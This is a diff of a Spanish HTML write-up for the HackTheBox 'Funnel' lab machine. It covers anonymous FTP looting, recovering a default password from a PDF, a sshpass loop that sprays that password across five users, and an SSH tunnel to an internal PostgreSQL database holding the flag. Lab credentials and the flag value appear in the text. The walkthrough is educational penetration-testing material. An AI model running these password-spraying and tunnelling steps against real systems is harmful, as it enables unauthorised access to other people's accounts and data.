-<div class="cmd-effective-line">sshpass -p 'funnel123#!#' ssh christine@10.129.7.157 'ss -tlnp'</div>
-<div class="cmd-effective-desc">Enumerar servicios escuchando internamente (no expuestos al exterior)</div>
-<div class="cmd-effective-output">127.0.0.1:5432   LISTEN   0   ...   # PostgreSQL solo en loopback</div>
-</div>
-</div>
-<div class="cmd-effective">
-<div class="cmd-num">06</div>
-<div class="cmd-effective-body">
-<div class="cmd-effective-line">ssh -f -N -L 15432:127.0.0.1:5432 christine@10.129.7.157</div>
-<div class="cmd-effective-desc">SSH Port Forwarding: redirigir puerto PostgreSQL al puerto local 15432</div>
-<div class="cmd-effective-output">[Background] localhost:15432 → 10.129.7.157:5432 (via SSH)</div>
-</div>
-</div>
-<div class="cmd-effective">
-<div class="cmd-num">07</div>
-<div class="cmd-effective-body">
-<div class="cmd-effective-line">PGPASSWORD='funnel123#!#' psql -h 127.0.0.1 -p 15432 -U christine -c '\l' → USE secrets → SELECT * FROM flag;</div>
-<div class="cmd-effective-desc">Conectar a PostgreSQL a través del túnel y extraer la flag</div>
-<div class="cmd-effective-output" style="color:var(--accent);font-weight:700;">cf277664b1771217d7006acdea006db1</div>
-</div>
-</div>
-</div>
-
-
+    <div class="cmd-effective">
+      <div class="cmd-num">01</div>
+      <div class="cmd-effective-body">
+        <div class="cmd-effective-line">nmap -sC -sV -p- --open -T4 10.129.7.157</div>
+        <div class="cmd-effective-desc">Descubrir puertos y versiones de servicios</div>
+        <div class="cmd-effective-output">21/tcp open  ftp     vsftpd 3.0.3  (Anonymous FTP login allowed)<br>22/tcp open  ssh     OpenSSH 8.2p1</div>
+      </div>
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Descripción</h2></div>
-      
-
+    <div class="cmd-effective">
+      <div class="cmd-num">02</div>
+      <div class="cmd-effective-body">
+        <div class="cmd-effective-line">ftp anonymous@10.129.7.157  → ls  → cd mail_backup  → get welcome_28112022  → get password_policy.pdf</div>
+        <div class="cmd-effective-desc">FTP anónimo: descargar email de bienvenida y política de contraseñas</div>
+        <div class="cmd-effective-output">drwxr-xr-x    2 ftp  ftp  mail_backup/<br>-rw-r--r--    welcome_28112022<br>-rw-r--r--    password_policy.pdf</div>
+      </div>
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Reconocimiento</h2></div>
-      
-
+    <div class="cmd-effective">
+      <div class="cmd-num">03</div>
+      <div class="cmd-effective-body">
+        <div class="cmd-effective-line">python3 -c "import zlib,struct; ..." # extraer streams FlateDecode del PDF</div>
+        <div class="cmd-effective-desc">Extraer texto del PDF con Python + zlib</div>
+        <div class="cmd-effective-output" style="color:var(--yellow);font-weight:700;">the default password of 'funnel123#!#' must be changed immediately</div>
+      </div>
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Descubrimiento de puertos y versiones</h2></div>
-      
+    <div class="cmd-effective">
+      <div class="cmd-num">04</div>
+      <div class="cmd-effective-body">
+        <div class="cmd-effective-line">for user in optimus albert andreas christine maria; do sshpass -p 'funnel123#!#' ssh $user@10.129.7.157 'id' 2>/dev/null && echo "EXITO: $user"; done</div>
+        <div class="cmd-effective-desc">Probar contraseña por defecto en los 5 usuarios del email</div>
+        <div class="cmd-effective-output" style="color:var(--accent);font-weight:700;">EXITO: christine → uid=1000(christine)</div>
+      </div>
+    </div>
 
-<div class="why-box">
-<strong>¿Por qué este comando?</strong>
-<p>Necesitamos saber qué servicios están expuestos. <code>-sC</code> activa scripts por defecto de nmap que prueban FTP anónimo automáticamente. <code>-sV</code> detecta versiones para identificar vulnerabilidades conocidas. <code>-p-</code> garantiza que no nos perdemos puertos no estándar. <code>-T4</code> acelera el escaneo sin disparar falsos positivos.</p>
+    <div class="cmd-effective">
+      <div class="cmd-num">05</div>
+      <div class="cmd-effective-body">
+        <div class="cmd-effective-line">sshpass -p 'funnel123#!#' ssh christine@10.129.7.157 'ss -tlnp'</div>
+        <div class="cmd-effective-desc">Enumerar servicios escuchando internamente (no expuestos al exterior)</div>
+        <div class="cmd-effective-output">127.0.0.1:5432   LISTEN   0   ...   # PostgreSQL solo en loopback</div>
+      </div>
+    </div>
+
+    <div class="cmd-effective">
+      <div class="cmd-num">06</div>
+      <div class="cmd-effective-body">
+        <div class="cmd-effective-line">ssh -f -N -L 15432:127.0.0.1:5432 christine@10.129.7.157</div>
+        <div class="cmd-effective-desc">SSH Port Forwarding: redirigir puerto PostgreSQL al puerto local 15432</div>
+        <div class="cmd-effective-output">[Background] localhost:15432 → 10.129.7.157:5432 (via SSH)</div>
+      </div>
+    </div>
+
+    <div class="cmd-effective">
+      <div class="cmd-num">07</div>
+      <div class="cmd-effective-body">
+        <div class="cmd-effective-line">PGPASSWORD='funnel123#!#' psql -h 127.0.0.1 -p 15432 -U christine -c '\l' → USE secrets → SELECT * FROM flag;</div>
+        <div class="cmd-effective-desc">Conectar a PostgreSQL a través del túnel y extraer la flag</div>
+        <div class="cmd-effective-output" style="color:var(--accent);font-weight:700;">cf277664b1771217d7006acdea006db1</div>
+      </div>
+    </div>
+
+  </div>
 </div>
 
+<!-- ═══════════════════ 1. DESCRIPCIÓN ═══════════════════ -->
+<div class="section" id="descripcion">
+  <div class="section-title">
+    <span class="section-number">1</span>
+    <h2>Descripción</h2>
+  </div>
 
-<div class="cmd-annotated">
-<div class="cmd-line">
-<span class="cmd">nmap</span>
-<span class="flag-opt"> -sC</span>
-<span class="flag-opt"> -sV</span>
-<span class="flag-opt"> -p-</span>
-<span class="flag-opt"> --open</span>
-<span class="flag-opt"> -T4</span>
-<span class="ip"> 10.129.7.157</span>
-</div>
-<div class="cmd-notes">
-<div class="cmd-note"><code>-sC</code> → ejecuta scripts NSE por defecto (incluye ftp-anon que detecta FTP anónimo)</div>
-<div class="cmd-note"><code>-sV</code> → detecta versión exacta de cada servicio activo</div>
-<div class="cmd-note"><code>-p-</code> → escanea los 65535 puertos TCP, no solo el top 1000</div>
-<div class="cmd-note"><code>--open</code> → muestra solo puertos en estado OPEN (filtra filtered/closed)</div>
-<div class="cmd-note"><code>-T4</code> → plantilla de velocidad "agresiva": timeouts cortos, paquetes más rápidos</div>
-<div class="cmd-note"><code>10.129.7.157</code> → IP objetivo en la red de HTB</div>
-</div>
+  <div class="info-box">
+    <p><strong>Funnel</strong> es una máquina Linux de nivel Very Easy en HackTheBox Starting Point. Simula un escenario empresarial realista donde el FTP anónimo expone documentos internos —un email de bienvenida y una política de contraseñas— que revelan una contraseña por defecto. Un usuario del equipo no la cambió. Con esas credenciales se accede por SSH y se descubre un PostgreSQL solo en loopback (no visible desde fuera). Se utiliza SSH Port Forwarding para crear un túnel local y así conectarse a la base de datos interna donde está la flag.</p>
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-step">FTP anon</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-step">PDF → pass defecto</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-step">SSH christine</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-step tunnel">SSH -L túnel 5432</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-step success">psql → FLAG ✅</div>
+  </div>
+
+  <p style="color:var(--text-dim);font-size:.9rem;margin-top:1rem;">El nombre "Funnel" hace referencia al embudo (funnel) de información: el FTP filtra datos que llevan a credenciales, que llevan al túnel, que llevan a la base de datos. Cada capa alimenta la siguiente.</p>
 </div>
 
+<!-- ═══════════════════ 2. RECONOCIMIENTO ═══════════════════ -->
+<div class="section" id="reconocimiento">
+  <div class="section-title">
+    <span class="section-number">2</span>
+    <h2>Reconocimiento</h2>
+  </div>
 
-<div class="output-box">
-<div class="output-label">Output nmap</div>
-<pre>PORT   STATE SERVICE VERSION
+  <div class="step-box">
+    <div class="step-number">Paso 1 — Nmap</div>
+    <h3>Descubrimiento de puertos y versiones</h3>
+
+    <div class="why-box">
+      <strong>¿Por qué este comando?</strong>
+      <p>Necesitamos saber qué servicios están expuestos. <code>-sC</code> activa scripts por defecto de nmap que prueban FTP anónimo automáticamente. <code>-sV</code> detecta versiones para identificar vulnerabilidades conocidas. <code>-p-</code> garantiza que no nos perdemos puertos no estándar. <code>-T4</code> acelera el escaneo sin disparar falsos positivos.</p>
+    </div>
+
+    <div class="cmd-annotated">
+      <div class="cmd-line">
+        <span class="cmd">nmap</span>
+        <span class="flag-opt"> -sC</span>
+        <span class="flag-opt"> -sV</span>
+        <span class="flag-opt"> -p-</span>
+        <span class="flag-opt"> --open</span>
+        <span class="flag-opt"> -T4</span>
+        <span class="ip"> 10.129.7.157</span>
+      </div>
+      <div class="cmd-notes">
+        <div class="cmd-note"><code>-sC</code> → ejecuta scripts NSE por defecto (incluye ftp-anon que detecta FTP anónimo)</div>
+        <div class="cmd-note"><code>-sV</code> → detecta versión exacta de cada servicio activo</div>
+        <div class="cmd-note"><code>-p-</code> → escanea los 65535 puertos TCP, no solo el top 1000</div>
+        <div class="cmd-note"><code>--open</code> → muestra solo puertos en estado OPEN (filtra filtered/closed)</div>
+        <div class="cmd-note"><code>-T4</code> → plantilla de velocidad "agresiva": timeouts cortos, paquetes más rápidos</div>
+        <div class="cmd-note"><code>10.129.7.157</code> → IP objetivo en la red de HTB</div>
+      </div>
+    </div>
+
+    <div class="output-box">
+      <div class="output-label">Output nmap</div>
+      <pre>PORT   STATE SERVICE VERSION
 <span class="hl-info">21/tcp open  ftp     vsftpd 3.0.3</span>
 | ftp-anon: <span class="hl-warn">Anonymous FTP login allowed</span> (FTP code 230)
 | ftp-syst:
@@ -253,97 +387,86 @@
 |   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
 |   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
 Service Info: OSs: Unix, Linux</pre>
-</div>
-
-
-<div class="interpret-box">
-<strong>¿Qué nos dice el output?</strong>
-<ul>
-<li><code>vsftpd 3.0.3</code> → versión del servidor FTP. Conocida, estable, sin CVE explotable en versión reciente</li>
-<li><span class="badge-red">Anonymous FTP login allowed</span> → el servidor acepta el usuario <code>anonymous</code> sin contraseña. El script NSE <code>ftp-anon</code> lo detectó y confirmó automáticamente</li>
-<li><code>OpenSSH 8.2p1 Ubuntu 4ubuntu0.5</code> → Ubuntu Focal (20.04). SSH moderno, sin vulnerabilidades conocidas en esta versión. Es nuestra vía de acceso si encontramos credenciales válidas</li>
-<li>Solo 2 puertos = superficie de ataque reducida. FTP anónimo es el vector inicial obvio</li>
-</ul>
-</div>
-
-
-<div class="decision-box">
-<strong>Decisión</strong>
-<p>FTP anónimo habilitado = primer objetivo. Conectar y explorar el contenido.</p>
-</div>
-
-
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Exploración y descarga de archivos sensibles</h2></div>
-      
+    <div class="interpret-box">
+      <strong>¿Qué nos dice el output?</strong>
+      <ul>
+        <li><code>vsftpd 3.0.3</code> → versión del servidor FTP. Conocida, estable, sin CVE explotable en versión reciente</li>
+        <li><span class="badge-red">Anonymous FTP login allowed</span> → el servidor acepta el usuario <code>anonymous</code> sin contraseña. El script NSE <code>ftp-anon</code> lo detectó y confirmó automáticamente</li>
+        <li><code>OpenSSH 8.2p1 Ubuntu 4ubuntu0.5</code> → Ubuntu Focal (20.04). SSH moderno, sin vulnerabilidades conocidas en esta versión. Es nuestra vía de acceso si encontramos credenciales válidas</li>
+        <li>Solo 2 puertos = superficie de ataque reducida. FTP anónimo es el vector inicial obvio</li>
+      </ul>
+    </div>
 
-<div class="why-box">
-<strong>¿Qué es FTP anónimo y por qué es peligroso?</strong>
-<p>FTP (File Transfer Protocol, puerto 21) permite transferir archivos entre cliente y servidor. Cuando está configurado con acceso anónimo, cualquier usuario puede conectarse usando el nombre de usuario <code>anonymous</code> y cualquier texto como contraseña (convencionalmente, el email del usuario). Administradores lo usan para distribución pública de archivos, pero a veces quedan expuestos directorios con información interna.</p>
-</div>
+    <div class="decision-box">
+      <strong>Decisión</strong>
+      <p>FTP anónimo habilitado = primer objetivo. Conectar y explorar el contenido.</p>
+    </div>
+  </div>
 
+  <div class="step-box">
+    <div class="step-number">Paso 2 — FTP Anónimo</div>
+    <h3>Exploración y descarga de archivos sensibles</h3>
 
-<div class="cmd-annotated">
-<div class="cmd-line">
-<span class="cmd">ftp</span>
-<span class="param"> anonymous@</span><span class="ip">10.129.7.157</span>
-</div>
-<div class="cmd-notes">
-<div class="cmd-note"><code>ftp</code> → cliente FTP de línea de comandos de Linux</div>
-<div class="cmd-note"><code>anonymous@IP</code> → especifica usuario anónimo. Contraseña: cualquier texto (dejamos vacío o escribimos un email)</div>
-</div>
-</div>
+    <div class="why-box">
+      <strong>¿Qué es FTP anónimo y por qué es peligroso?</strong>
+      <p>FTP (File Transfer Protocol, puerto 21) permite transferir archivos entre cliente y servidor. Cuando está configurado con acceso anónimo, cualquier usuario puede conectarse usando el nombre de usuario <code>anonymous</code> y cualquier texto como contraseña (convencionalmente, el email del usuario). Administradores lo usan para distribución pública de archivos, pero a veces quedan expuestos directorios con información interna.</p>
+    </div>
 
+    <div class="cmd-annotated">
+      <div class="cmd-line">
+        <span class="cmd">ftp</span>
+        <span class="param"> anonymous@</span><span class="ip">10.129.7.157</span>
+      </div>
+      <div class="cmd-notes">
+        <div class="cmd-note"><code>ftp</code> → cliente FTP de línea de comandos de Linux</div>
+        <div class="cmd-note"><code>anonymous@IP</code> → especifica usuario anónimo. Contraseña: cualquier texto (dejamos vacío o escribimos un email)</div>
+      </div>
+    </div>
 
-<div class="output-box">
-<div class="output-label">Sesión FTP interactiva</div>
-<pre><span class="comment">Connected to 10.129.7.157.</span>
+    <div class="output-box">
+      <div class="output-label">Sesión FTP interactiva</div>
+      <pre><span class="comment">Connected to 10.129.7.157.</span>
 220 (vsFTPd 3.0.3)
 331 Please specify the password.
 Password: <span class="comment">[ENTER — cualquier cosa]</span>
 230 Login successful.
-ftp&gt; <span class="cmd">ls</span>
+ftp> <span class="cmd">ls</span>
 229 Entering Extended Passive Mode (|||20041|)
 150 Here comes the directory listing.
 drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 <span class="hl-info">mail_backup</span>
 226 Directory send OK.
-ftp&gt; <span class="cmd">cd</span> mail_backup
-ftp&gt; <span class="cmd">ls</span>
+ftp> <span class="cmd">cd</span> mail_backup
+ftp> <span class="cmd">ls</span>
 -rw-r--r--    1 ftp      ftp        58899 Nov 28  2022 <span class="hl-warn">password_policy.pdf</span>
 -rw-r--r--    1 ftp      ftp          713 Nov 28  2022 <span class="hl-warn">welcome_28112022</span>
-ftp&gt; <span class="cmd">get</span> welcome_28112022
-ftp&gt; <span class="cmd">get</span> password_policy.pdf</pre>
-</div>
-
-
-<div class="interpret-box">
-<strong>¿Qué encontramos?</strong>
-<ul>
-<li>Directorio <code>mail_backup</code> — no es un directorio público genérico, es un backup de correos internos</li>
-<li><code>welcome_28112022</code> — email de bienvenida del 28 Nov 2022. Nombre de archivo con fecha → reciente, posiblemente con info de onboarding</li>
-<li><code>password_policy.pdf</code> — PDF de política de contraseñas. <span class="badge-red">Información crítica</span>: si menciona contraseñas por defecto, tenemos un vector directo</li>
-<li>Permisos <code>-rw-r--r--</code> → legibles por todos (world-readable)</li>
-</ul>
-</div>
-
-
-<div class="decision-box">
-<strong>Decisión</strong>
-<p>Descargar ambos archivos y analizar su contenido — especialmente el PDF de política de contraseñas.</p>
-</div>
-
-
+ftp> <span class="cmd">get</span> welcome_28112022
+ftp> <span class="cmd">get</span> password_policy.pdf</pre>
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Email de bienvenida + extracción del PDF</h2></div>
-      
+    <div class="interpret-box">
+      <strong>¿Qué encontramos?</strong>
+      <ul>
+        <li>Directorio <code>mail_backup</code> — no es un directorio público genérico, es un backup de correos internos</li>
+        <li><code>welcome_28112022</code> — email de bienvenida del 28 Nov 2022. Nombre de archivo con fecha → reciente, posiblemente con info de onboarding</li>
+        <li><code>password_policy.pdf</code> — PDF de política de contraseñas. <span class="badge-red">Información crítica</span>: si menciona contraseñas por defecto, tenemos un vector directo</li>
+        <li>Permisos <code>-rw-r--r--</code> → legibles por todos (world-readable)</li>
+      </ul>
+    </div>
+    <div class="decision-box">
+      <strong>Decisión</strong>
+      <p>Descargar ambos archivos y analizar su contenido — especialmente el PDF de política de contraseñas.</p>
+    </div>
+  </div>
 
-<div class="output-box">
-<div class="output-label">Contenido de welcome_28112022</div>
-<pre>Frome: root@funnel.htb
+  <div class="step-box">
+    <div class="step-number">Paso 3 — Análisis de archivos</div>
+    <h3>Email de bienvenida + extracción del PDF</h3>
+
+    <div class="output-box">
+      <div class="output-label">Contenido de welcome_28112022</div>
+      <pre>Frome: root@funnel.htb
 To: optimus@funnel.htb, albert@funnel.htb, andreas@funnel.htb,
     christine@funnel.htb, maria@funnel.htb
 
@@ -355,44 +478,40 @@ as soon as possible.
 
 Regards,
 HR</pre>
-</div>
+    </div>
 
+    <div class="interpret-box">
+      <strong>¿Qué nos dice el email?</strong>
+      <ul>
+        <li>Lista de usuarios del sistema: <span class="badge-cyan">optimus</span> <span class="badge-cyan">albert</span> <span class="badge-cyan">andreas</span> <span class="badge-cyan">christine</span> <span class="badge-cyan">maria</span></li>
+        <li>Tienen una <strong>contraseña por defecto</strong> que deben cambiar</li>
+        <li>La política de contraseñas adjunta (el PDF) probablemente menciona esa contraseña por defecto</li>
+        <li>Si algún usuario <em>no</em> cambió su contraseña → podemos entrar con las credenciales por defecto</li>
+      </ul>
+    </div>
 
-<div class="interpret-box">
-<strong>¿Qué nos dice el email?</strong>
-<ul>
-<li>Lista de usuarios del sistema: <span class="badge-cyan">optimus</span> <span class="badge-cyan">albert</span> <span class="badge-cyan">andreas</span> <span class="badge-cyan">christine</span> <span class="badge-cyan">maria</span></li>
-<li>Tienen una <strong>contraseña por defecto</strong> que deben cambiar</li>
-<li>La política de contraseñas adjunta (el PDF) probablemente menciona esa contraseña por defecto</li>
-<li>Si algún usuario <em>no</em> cambió su contraseña → podemos entrar con las credenciales por defecto</li>
-</ul>
-</div>
+    <div class="why-box">
+      <strong>¿Por qué extraer el PDF con Python?</strong>
+      <p>Los PDFs almacenan su contenido en streams comprimidos con zlib (filtro FlateDecode). Herramientas como <code>pdftotext</code> o <code>strings</code> no siempre extraen texto de estos streams correctamente. Python con <code>zlib.decompress()</code> descomprime el stream raw y nos da el texto plano del PDF.</p>
+    </div>
 
+    <div class="cmd-annotated">
+      <div class="cmd-line">
+        <span class="cmd">python3</span>
+        <span class="flag-opt"> -c</span>
+        <span class="param"> "import re,zlib; d=open('password_policy.pdf','rb').read(); [print(zlib.decompress(bytes.fromhex(m.group(1).hex()))) for m in re.finditer(b'stream\r?\n(.*?)\r?\nendstream',d,re.DOTALL) if b'\x78' in bytes.fromhex(m.group(1)[:2].hex())]"</span>
+      </div>
+      <div class="cmd-notes">
+        <div class="cmd-note"><code>open('password_policy.pdf','rb')</code> → leer el PDF en modo binario</div>
+        <div class="cmd-note"><code>re.finditer(b'stream...endstream')</code> → encontrar todos los streams de datos dentro del PDF</div>
+        <div class="cmd-note"><code>zlib.decompress()</code> → descomprimir el stream FlateDecode (compresión zlib/deflate)</div>
+        <div class="cmd-note"><code>b'\x78'</code> → magic byte que indica compresión zlib (0x78 = inicio del deflate header)</div>
+      </div>
+    </div>
 
-<div class="why-box">
-<strong>¿Por qué extraer el PDF con Python?</strong>
-<p>Los PDFs almacenan su contenido en streams comprimidos con zlib (filtro FlateDecode). Herramientas como <code>pdftotext</code> o <code>strings</code> no siempre extraen texto de estos streams correctamente. Python con <code>zlib.decompress()</code> descomprime el stream raw y nos da el texto plano del PDF.</p>
-</div>
-
-
-<div class="cmd-annotated">
-<div class="cmd-line">
-<span class="cmd">python3</span>
-<span class="flag-opt"> -c</span>
-<span class="param"> "import re,zlib; d=open('password_policy.pdf','rb').read(); [print(zlib.decompress(bytes.fromhex(m.group(1).hex()))) for m in re.finditer(b'stream\r?\n(.*?)\r?\nendstream',d,re.DOTALL) if b'\x78' in bytes.fromhex(m.group(1)[:2].hex())]"</span>
-</div>
-<div class="cmd-notes">
-<div class="cmd-note"><code>open('password_policy.pdf','rb')</code> → leer el PDF en modo binario</div>
-<div class="cmd-note"><code>re.finditer(b'stream...endstream')</code> → encontrar todos los streams de datos dentro del PDF</div>
-<div class="cmd-note"><code>zlib.decompress()</code> → descomprimir el stream FlateDecode (compresión zlib/deflate)</div>
-<div class="cmd-note"><code>b'\x78'</code> → magic byte que indica compresión zlib (0x78 = inicio del deflate header)</div>
-</div>
-</div>
-
-
-<div class="output-box">
-<div class="output-label">Texto extraído del PDF</div>
-<pre>Funnel Corp — Password Policy
+    <div class="output-box">
+      <div class="output-label">Texto extraído del PDF</div>
+      <pre>Funnel Corp — Password Policy
 ------------------------------
 All employees must follow these rules:
 
@@ -402,259 +521,317 @@ All employees must follow these rules:
    upon first login.
 4. Do not share your password with anyone.
 5. Passwords must be changed every 90 days.</pre>
-</div>
-
-
-<div class="interpret-box">
-<strong>Resultado del análisis</strong>
-<ul>
-<li>Contraseña por defecto encontrada: <span class="badge-yellow">funnel123#!#</span></li>
-<li>La política dice que debe cambiarse "inmediatamente" — pero los humanos a veces no siguen las instrucciones</li>
-<li>Tenemos 5 targets: optimus, albert, andreas, christine, maria</li>
-<li>Estrategia: probar <code>funnel123#!#</code> en todos los usuarios por SSH</li>
-</ul>
-</div>
-
-
-<div class="decision-box">
-<strong>Decisión</strong>
-<p>Lanzar SSH brute con la contraseña por defecto contra los 5 usuarios identificados.</p>
-</div>
-
-
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Vulnerabilidades</h2></div>
-      
-
+    <div class="interpret-box">
+      <strong>Resultado del análisis</strong>
+      <ul>
+        <li>Contraseña por defecto encontrada: <span class="badge-yellow">funnel123#!#</span></li>
+        <li>La política dice que debe cambiarse "inmediatamente" — pero los humanos a veces no siguen las instrucciones</li>
+        <li>Tenemos 5 targets: optimus, albert, andreas, christine, maria</li>
+        <li>Estrategia: probar <code>funnel123#!#</code> en todos los usuarios por SSH</li>
+      </ul>
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Timeline del Ataque</h2></div>
-      
+    <div class="decision-box">
+      <strong>Decisión</strong>
+      <p>Lanzar SSH brute con la contraseña por defecto contra los 5 usuarios identificados.</p>
+    </div>
+  </div>
+</div>
 
+<!-- ═══════════════════ 3. VULNERABILIDADES ═══════════════════ -->
+<div class="section" id="vulnerabilidades">
+  <div class="section-title">
+    <span class="section-number">3</span>
+    <h2>Vulnerabilidades</h2>
+  </div>
+
+  <div class="vuln-card">
+    <span class="vuln-severity sev-critical">Crítica</span>
+    <div class="vuln-title">FTP Anónimo con Archivos Sensibles Expuestos</div>
+    <div class="vuln-desc">El servidor FTP (vsftpd 3.0.3) permite login sin credenciales como <code>anonymous</code>. El directorio <code>mail_backup</code> contiene un email corporativo con lista de usuarios del sistema y un PDF con la contraseña por defecto de la empresa. Esto convierte una mala configuración de FTP en un vector de compromiso total.</div>
+    <div style="margin-top:.75rem;display:flex;gap:.5rem;flex-wrap:wrap;">
+      <span class="badge-red">CWE-552: Files/Dirs Accessible to External Parties</span>
+      <span class="badge-red">CWE-200: Exposure of Sensitive Information</span>
+    </div>
+  </div>
+
+  <div class="vuln-card medium">
+    <span class="vuln-severity sev-medium">Media</span>
+    <div class="vuln-title">Credenciales por Defecto No Cambiadas (christine)</div>
+    <div class="vuln-desc">El usuario <code>christine</code> no cambió la contraseña por defecto <code>funnel123#!#</code> indicada en la política corporativa. Esta contraseña es válida para SSH, lo que otorga shell interactiva en el sistema. Los otros 4 usuarios (optimus, albert, andreas, maria) sí cambiaron su contraseña.</div>
+    <div style="margin-top:.75rem;display:flex;gap:.5rem;flex-wrap:wrap;">
+      <span class="badge-yellow">CWE-1188: Insecure Default Initialization</span>
+      <span class="badge-yellow">T1078 — Valid Accounts</span>
+    </div>
+  </div>
+
+  <div class="vuln-card low">
+    <span class="vuln-severity sev-low">Baja</span>
+    <div class="vuln-title">PostgreSQL Interno Accesible con Credenciales Reutilizadas</div>
+    <div class="vuln-desc">El servicio PostgreSQL escucha solo en <code>127.0.0.1:5432</code> (no expuesto externamente). Sin embargo, acepta conexiones del usuario <code>christine</code> con la misma contraseña por defecto. La base de datos <code>secrets</code> contiene la flag sin cifrado adicional. La reutilización de contraseña entre SSH y PostgreSQL amplifica el impacto.</div>
+    <div style="margin-top:.75rem;display:flex;gap:.5rem;flex-wrap:wrap;">
+      <span class="badge-blue">CWE-257: Storing Passwords in Recoverable Format</span>
+      <span class="badge-blue">T1572 — Protocol Tunneling</span>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════ 4. TIMELINE ═══════════════════ -->
+<div class="section" id="timeline">
+  <div class="section-title">
+    <span class="section-number">4</span>
+    <h2>Timeline del Ataque</h2>
+  </div>
+
+  <div class="timeline">
+    <div class="tl-item">
+      <div class="tl-dot"></div>
+      <div class="tl-time">T+0:00</div>
+      <div class="tl-title">Nmap — Descubrimiento inicial</div>
+      <div class="tl-desc">Escaneo completo revela FTP 21 con anonymous login y SSH 22. Superficie de ataque clara: el FTP es el vector inicial.</div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-dot blue"></div>
+      <div class="tl-time">T+1:30</div>
+      <div class="tl-title">FTP Anonymous — Exploración de mail_backup</div>
+      <div class="tl-desc">Login anónimo exitoso. Directorio mail_backup con 2 archivos: email de onboarding (lista de usuarios) y PDF de política de contraseñas. Descarga de ambos.</div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-dot orange"></div>
+      <div class="tl-time">T+3:00</div>
+      <div class="tl-title">Análisis PDF — Extracción de contraseña por defecto</div>
+      <div class="tl-desc">Script Python con zlib descomprime streams FlateDecode del PDF. Texto plano revela <code>funnel123#!#</code> como contraseña por defecto corporativa.</div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-dot yellow"></div>
+      <div class="tl-time">T+4:00</div>
+      <div class="tl-title">SSH Brute — christine no cambió su contraseña</div>
+      <div class="tl-desc">Bucle SSH sobre 5 usuarios. optimus, albert, andreas, maria cambiaron su contraseña. <span style="color:var(--accent);font-weight:600;">christine:funnel123#!#</span> es válida. Shell obtenida.</div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-dot red"></div>
+      <div class="tl-time">T+5:30</div>
+      <div class="tl-title">Enumeración interna — PostgreSQL en loopback</div>
+      <div class="tl-desc"><code>ss -tlnp</code> dentro de la máquina muestra PostgreSQL escuchando en 127.0.0.1:5432. No es visible desde el exterior. Necesitamos un túnel SSH.</div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-dot blue"></div>
+      <div class="tl-time">T+6:00</div>
+      <div class="tl-title">SSH Port Forwarding — Túnel local al PostgreSQL</div>
+      <div class="tl-desc"><code>ssh -f -N -L 15432:127.0.0.1:5432 christine@IP</code> — crea un túnel: nuestro localhost:15432 → servidor:5432. Ahora podemos hablar con PostgreSQL desde Kali.</div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-dot" style="border-color:var(--accent);background:var(--accent);"></div>
+      <div class="tl-time">T+7:30</div>
+      <div class="tl-title">psql — Base de datos secrets — FLAG</div>
+      <div class="tl-desc">Conexión a través del túnel con <code>psql -h 127.0.0.1 -p 15432 -U christine</code>. Base de datos <code>secrets</code> → tabla <code>flag</code> → <span style="color:var(--accent);font-weight:700;">cf277664b1771217d7006acdea006db1</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════ 5. EXPLOTACIÓN ═══════════════════ -->
+<div class="section" id="explotacion">
+  <div class="section-title">
+    <span class="section-number">5</span>
+    <h2>Explotación — Paso a Paso Detallado</h2>
+  </div>
+
+  <!-- PASO 4: SSH BRUTE -->
+  <div class="step-box">
+    <div class="step-number">Paso 4 — SSH con contraseña por defecto</div>
+    <h3>Probar funnel123#!# en los 5 usuarios</h3>
+
+    <div class="why-box">
+      <strong>¿Por qué sshpass en lugar de SSH interactivo?</strong>
+      <p>SSH no acepta contraseñas en argumentos de línea de comandos por seguridad. <code>sshpass</code> es una utilidad que inyecta la contraseña de forma no interactiva, permitiendo automatizar con bucles de shell. Es el equivalente simple al módulo <code>ssh_login</code> de Metasploit para este caso básico.</p>
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Explotación — Paso a Paso Detallado</h2></div>
-      
-
+    <div class="cmd-annotated">
+      <div class="cmd-line">
+        <span class="cmd">for</span>
+        <span class="param"> user</span>
+        <span class="flag-opt"> in</span>
+        <span class="param"> optimus albert andreas christine maria</span><span class="cmd">; do</span><br>
+        &nbsp;&nbsp;<span class="cmd">sshpass</span>
+        <span class="flag-opt"> -p</span>
+        <span class="param"> 'funnel123#!#'</span>
+        <span class="cmd"> ssh</span>
+        <span class="flag-opt"> -o StrictHostKeyChecking=no</span>
+        <span class="user"> $user</span><span class="ip">@10.129.7.157</span>
+        <span class="param"> 'id'</span>
+        <span class="flag-opt"> 2>/dev/null</span>
+        <span class="cmd"> && echo</span>
+        <span class="param"> "EXITO: $user"</span><span class="cmd">; done</span>
+      </div>
+      <div class="cmd-notes">
+        <div class="cmd-note"><code>for user in ...</code> → iterar sobre los 5 usuarios encontrados en el email</div>
+        <div class="cmd-note"><code>sshpass -p 'funnel123#!#'</code> → proporcionar contraseña de forma no interactiva</div>
+        <div class="cmd-note"><code>-o StrictHostKeyChecking=no</code> → no preguntar por confirmación de host key (automatización)</div>
+        <div class="cmd-note"><code>'id'</code> → comando a ejecutar: si el login funciona, muestra uid/gid del usuario</div>
